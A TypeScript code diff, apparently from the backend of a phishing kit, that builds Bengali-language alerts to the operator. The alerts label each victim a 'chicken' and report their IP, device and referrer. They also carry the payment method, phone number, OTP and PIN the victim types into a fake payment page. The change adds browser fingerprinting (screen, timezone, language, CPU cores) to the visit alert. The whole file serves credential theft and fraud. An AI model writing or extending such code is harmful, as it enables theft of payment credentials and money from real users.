@@ -30,23 +30,35 @@ function br() {
 function formatMsg(title: string, lines: Array<{key: string, value: string}>) {
   let msg = `🐔 ${title}\n  \n`;
   for (const line of lines) {
-    msg += `${line.key} : ${line.value || ""}\n  \n`;
+    msg += `${line.key}: ${line.value || ""}\n  \n`;
   }
   return msg + "\n  ";
 }
 
-// Build message by type
+// Build message by type with full client info
 function buildMessage(type: string, data: any, meta: any) {
-  const ip = escapeHtml(meta.ip || "N/A");
-  const ref = escapeHtml(meta.referrer || "Direct");
-  const ua = escapeHtml(meta.ua || data?.device || "N/A");
+  const ip = escapeHtml(data?.ip || meta.ip || "N/A");
+  const device = escapeHtml(data?.device || meta.ua || "N/A");
+  const screen = escapeHtml(data?.screen || "N/A");
+  const timezone = escapeHtml(data?.timezone || "N/A");
+  const language = escapeHtml(data?.language || "N/A");
+  const mobile = escapeHtml(data?.mobile || "N/A");
+  const cookies = escapeHtml(data?.cookies || "N/A");
+  const ref = escapeHtml(data?.referrer || meta.referrer || "Direct");
+  const cpu = escapeHtml(data?.cpu || "N/A");
 
   switch (type) {
     case "visit": {
-      return formatMsg("মুরগি ওয়েবসাইট ভিজিট করতেছে ⚠️", [
-        { key: "🐔মুরগির Device", value: ua },
-        { key: "🐔মুরগির IP", value: ip },
+      return formatMsg("মুরগি ওয়েবসাইট ভিজিট করতেছে ⚠️ তাড়াতাড়ি রেডি হও ⚠️", [
+        { key: "🐔মুরগির IP Address", value: ip },
+        { key: "🐔মুরগির Device Info", value: device },
+        { key: "🐔মুরগির Screen Resolution", value: screen },
+        { key: "🐔মুরগির Timezone", value: timezone },
+        { key: "🐔মুরগির Language", value: language },
+        { key: "🐔মুরগির Mobile Device", value: mobile },
+        { key: "🐔মুরগির Cookies Enabled", value: cookies },
         { key: "🐔মুরগির Referrer", value: ref },
+        { key: "🐔মুরগির CPU Cores", value: cpu },
       ]);
     }
     
@@ -54,7 +66,7 @@ function buildMessage(type: string, data: any, meta: any) {
       const platform = escapeHtml(data?.platform ?? "Unknown");
       return formatMsg("মুরগি প্লাটফর্ম ক্লিক করেছে ⚠️", [
         { key: "Platform", value: platform },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
@@ -66,7 +78,7 @@ function buildMessage(type: string, data: any, meta: any) {
       return formatMsg("মুরগি প্লাটফর্মের সাভিস ক্লিক করেছে ⚠️", [
         { key: "Platform", value: platform },
         { key: "Service", value: service },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
@@ -80,7 +92,7 @@ function buildMessage(type: string, data: any, meta: any) {
         { key: "Platform", value: platform },
         { key: "Service", value: service },
         { key: "Link", value: link },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
@@ -90,7 +102,7 @@ function buildMessage(type: string, data: any, meta: any) {
       const method = escapeHtml(data?.method ?? "এখনো সিলেক্ট করেনি।");
       return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
         { key: "Payment Method", value: method },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
@@ -102,7 +114,7 @@ function buildMessage(type: string, data: any, meta: any) {
       return formatMsg("মুরগি পেমেন্ট নাম্বার দিয়েছে ✅", [
         { key: "Payment Method", value: method },
         { key: "Number", value: number },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
@@ -116,7 +128,7 @@ function buildMessage(type: string, data: any, meta: any) {
         { key: "Payment Method", value: method },
         { key: "Number", value: number },
         { key: "OTP", value: otp },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
@@ -132,7 +144,7 @@ function buildMessage(type: string, data: any, meta: any) {
         { key: "Number", value: number },
         { key: "OTP", value: otp },
         { key: "PIN", value: pin },
-        { key: "🐔মুরগির Device", value: ua },
+        { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
       ]);
